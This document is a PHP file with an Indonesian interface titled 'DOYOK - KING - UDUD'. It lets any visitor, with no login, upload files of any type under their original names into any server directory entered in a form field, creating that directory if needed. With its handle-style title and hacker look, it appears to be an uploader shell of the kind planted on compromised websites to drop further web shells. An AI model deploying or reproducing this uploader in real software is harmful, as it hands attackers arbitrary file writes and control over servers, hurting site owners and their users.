<?php
// Bagian Logika PHP untuk memproses unggahan file

$pesan_sukses = '';
$pesan_error = '';

// Direktori dasar adalah direktori tempat file ini berada (untuk nilai awal input)
$base_dir = __DIR__ . '/';

// Cek jika ada request POST
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_FILES["berkas"])) {

    // Ambil input direktori dari pengguna
    $custom_dir = isset($_POST['custom_dir']) ? rtrim(trim($_POST['custom_dir']), '/\\') : $base_dir;

    // Pastikan direktori tujuan ada dan dapat ditulis
    if (!is_dir($custom_dir)) {
        if (!mkdir($custom_dir, 0755, true)) {
            $pesan_error = "Gagal membuat direktori tujuan.";
        }
    }

    // Proses multiple file upload
    $files = $_FILES['berkas'];
    $file_count = count($files['name']);
    $sukses_count = 0;
    $error_messages = [];

    for ($i = 0; $i < $file_count; $i++) {
        if ($files['error'][$i] !== UPLOAD_ERR_OK) {
            switch ($files['error'][$i]) {
                case UPLOAD_ERR_INI_SIZE:
                    $error_messages[] = "File '" . htmlspecialchars($files['name'][$i]) . "' terlalu besar (melebihi pengaturan server).";
                    break;
                case UPLOAD_ERR_NO_FILE:
                    // Skip jika tidak ada file
                    continue 2;
                case UPLOAD_ERR_CANT_WRITE:
                    $error_messages[] = "Server error: Gagal menulis file '" . htmlspecialchars($files['name'][$i]) . "' ke disk.";
                    break;
                default:
                    $error_messages[] = "Terjadi kesalahan saat mengunggah file '" . htmlspecialchars($files['name'][$i]) . "'.";
                    break;
            }
        } else {
            // Kumpulkan informasi file
            $nama_asli = basename($files['name'][$i]);
            $ukuran_file = $files['size'][$i];
            $tmp_file = $files['tmp_name'][$i];

            // Batas ukuran file (contoh: 50MB)
            $max_file_size = 50 * 1024 * 1024;
            if ($ukuran_file > $max_file_size) {
                $error_messages[] = "Ukuran file '" . htmlspecialchars($nama_asli) . "' tidak boleh lebih dari 50MB.";
                continue;
            }

            // Gunakan nama asli file
            $target_file = $custom_dir . '/' . $nama_asli;

            // Pindahkan file
            if (move_uploaded_file($tmp_file, $target_file)) {
                $sukses_count++;
            } else {
                $error_messages[] = "Gagal memindahkan file '" . htmlspecialchars($nama_asli) . "'. Pastikan direktori dapat ditulisi.";
            }
        }
    }

    // Buat pesan sukses jika ada file yang berhasil diunggah
    if ($sukses_count > 0) {
        $pesan_sukses = "$sukses_count file berhasil diunggah.";
    }

    // Gabungkan semua pesan error jika ada
    if (!empty($error_messages)) {
        $pesan_error = implode("<br>", $error_messages);
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DOYOK - KING - UDUD</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Exo 2', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #000000;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            color: #ffffff;
            overflow-x: hidden;
        }
        .container {
            background: #1a1a1a;
            padding: 2rem 3rem 2rem 2rem;
            border-radius: 0 20px 20px 0;
            border-left: 4px solid #ffffff;
            box-shadow: 0 0 30px rgba(255, 255, 255, 0.1);
            width: 100%;
            max-width: 500px;
            position: relative;
            transform: perspective(1000px) rotateY(-5deg);
            transition: transform 0.3s ease;
        }
        .container:hover {
            transform: perspective(1000px) rotateY(0deg);
        }
        h2 {
            text-align: left;
            color: #ffffff;
            font-size: 2rem;
            font-weight: 700;
            margin-bottom: 2rem;
            text-transform: uppercase;
            letter-spacing: 3px;
            position: relative;
            animation: pulse 3s ease-in-out infinite;
        }
        h2::after {
            content: '';
            position: absolute;
            bottom: -5px;
            left: 0;
            width: 50px;
            height: 3px;
            background: #ffffff;
            animation: slideRight 3s ease-in-out infinite;
        }
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }
        @keyframes slideRight {
            0% { width: 50px; }
            50% { width: 100px; }
            100% { width: 50px; }
        }
        form {
            display: grid;
            gap: 1.8rem;
        }
        label {
            color: #cccccc;
            font-size: 0.9rem;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
            transform: translateX(10px);
            transition: transform 0.3s ease, color 0.3s ease;
        }
        label:hover {
            color: #ffffff;
            transform: translateX(15px);
        }
        input[type="file"],
        input[type="text"] {
            background: transparent;
            border: none;
            border-bottom: 2px solid #ffffff;
            padding: 0.8rem 0.5rem;
            color: #ffffff;
            font-size: 0.95rem;
            transition: border-color 0.3s ease, transform 0.3s ease;
            position: relative;
        }
        input[type="file"]::before,
        input[type="text"]::before {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 0;
            height: 2px;
            background: #ffffff;
            transition: width 0.3s ease;
        }
        input[type="file"]:hover::before,
        input[type="text"]:hover::before {
            width: 100%;
        }
        input[type="file"]:hover,
        input[type="text"]:hover {
            transform: translateY(-3px);
        }
        input[type="file"]::-webkit-file-upload-button {
            background: transparent;
            color: #ffffff;
            border: 2px solid #ffffff;
            padding: 0.6rem 1rem;
            border-radius: 5px;
            cursor: pointer;
            font-weight: 600;
            text-transform: uppercase;
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }
        input[type="file"]::-webkit-file-upload-button:hover {
            transform: scale(1.1);
            box-shadow: 0 0 15px rgba(255, 255, 255, 0.3);
        }
        input[type="file"]:focus,
        input[type="text"]:focus {
            outline: none;
            border-bottom-color: #ffffff;
        }
        input[type="submit"] {
            background: transparent;
            color: #ffffff;
            border: 2px solid #ffffff;
            padding: 0.8rem;
            border-radius: 5px;
            font-size: 1rem;
            font-weight: 600;
            text-transform: uppercase;
            cursor: pointer;
            transition: transform 0.3s ease, box-shadow 0.3s ease;
            position: relative;
            transform: perspective(500px) rotateX(5deg);
        }
        input[type="submit"]:hover {
            transform: perspective(500px) rotateX(0deg);
            box-shadow: 0 0 20px rgba(255, 255, 255, 0.4);
        }
        /* Popup Styles */
        .popup {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%) scale(0.8);
            background: #1a1a1a;
            padding: 1.5rem;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(255, 255, 255, 0.2);
            width: 80%;
            max-width: 400px;
            z-index: 1000;
            animation: fadeInScale 0.3s ease-in-out forwards;
            border: 2px solid;
        }
        .popup.success {
            border-color: #ffffff;
            color: #ffffff;
        }
        .popup.error {
            border-color: #ff6666;
            color: #ff6666;
        }
        .popup-content {
            text-align: center;
            font-size: 0.95rem;
            margin-bottom: 1rem;
        }
        .popup-close {
            background: transparent;
            color: #ffffff;
            border: 2px solid #ffffff;
            padding: 0.5rem 1rem;
            border-radius: 5px;
            cursor: pointer;
            font-size: 0.9rem;
            font-weight: 600;
            text-transform: uppercase;
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }
        .popup-close:hover {
            transform: scale(1.1);
            box-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
        }
        .overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            z-index: 999;
        }
        .popup.active,
        .overlay.active {
            display: block;
        }
        @keyframes fadeInScale {
            from { opacity: 0; transform: translate(-50%, -50%) scale(0.8); }
            to { opacity: 1; transform: translate(-50%, -50%) scale(1); }
        }
        /* Responsif untuk perangkat mobile */
        @media (max-width: 768px) {
            .container {
                padding: 1.5rem 2rem 1.5rem 1.5rem;
                max-width: 90%;
            }
            h2 {
                font-size: 1.6rem;
                letter-spacing: 2px;
            }
            input[type="file"],
            input[type="text"],
            input[type="submit"] {
                font-size: 0.9rem;
                padding: 0.7rem 0.4rem;
            }
            input[type="file"]::-webkit-file-upload-button {
                padding: 0.5rem 0.8rem;
            }
            label {
                font-size: 0.85rem;
            }
            .popup {
                width: 90%;
                padding: 1rem;
            }
            .popup-content {
                font-size: 0.9rem;
            }
            .popup-close {
                padding: 0.4rem 0.8rem;
                font-size: 0.85rem;
            }
        }
        @media (max-width: 480px) {
            .container {
                padding: 1rem 1.5rem 1rem 1rem;
            }
            h2 {
                font-size: 1.3rem;
                letter-spacing: 1px;
            }
            input[type="file"],
            input[type="text"],
            input[type="submit"] {
                font-size: 0.85rem;
                padding: 0.6rem 0.3rem;
            }
            input[type="file"]::-webkit-file-upload-button {
                padding: 0.4rem 0.7rem;
            }
            label {
                font-size: 0.8rem;
            }
            .popup {
                width: 95%;
                padding: 0.8rem;
            }
            .popup-content {
                font-size: 0.85rem;
            }
            .popup-close {
                padding: 0.3rem 0.7rem;
                font-size: 0.8rem;
            }
        }
    </style>
</head>
<body>

    <div class="overlay" id="overlay"></div>

    <?php if (!empty($pesan_sukses)) : ?>
        <div class="popup success active" id="popup-success">
            <div class="popup-content"><?php echo $pesan_sukses; ?></div>
            <button class="popup-close" onclick="closePopup('popup-success')">Tutup</button>
        </div>
    <?php endif; ?>

    <?php if (!empty($pesan_error)) : ?>
        <div class="popup error active" id="popup-error">
            <div class="popup-content"><?php echo $pesan_error; ?></div>
            <button class="popup-close" onclick="closePopup('popup-error')">Tutup</button>
        </div>
    <?php endif; ?>

    <div class="container">
        <h2>DOYOK - KING - UDUD</h2>

        <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post" enctype="multipart/form-data">
            <label for="berkas">Pilih file untuk diunggah:</label>
            <input type="file" name="berkas[]" id="berkas" multiple required>
            <label for="custom_dir">Direktori tujuan:</label>
            <input type="text" name="custom_dir" id="custom_dir" value="<?php echo htmlspecialchars($base_dir); ?>" required>
            <input type="submit" value="Unggah File" name="submit">
        </form>
    </div>

    <script>
        function closePopup(popupId) {
            document.getElementById(popupId).classList.remove('active');
            document.getElementById('overlay').classList.remove('active');
        }

        // Aktifkan overlay jika ada popup yang aktif
        <?php if (!empty($pesan_sukses) || !empty($pesan_error)) : ?>
            document.getElementById('overlay').classList.add('active');
        <?php endif; ?>
    </script>

</body>
</html>
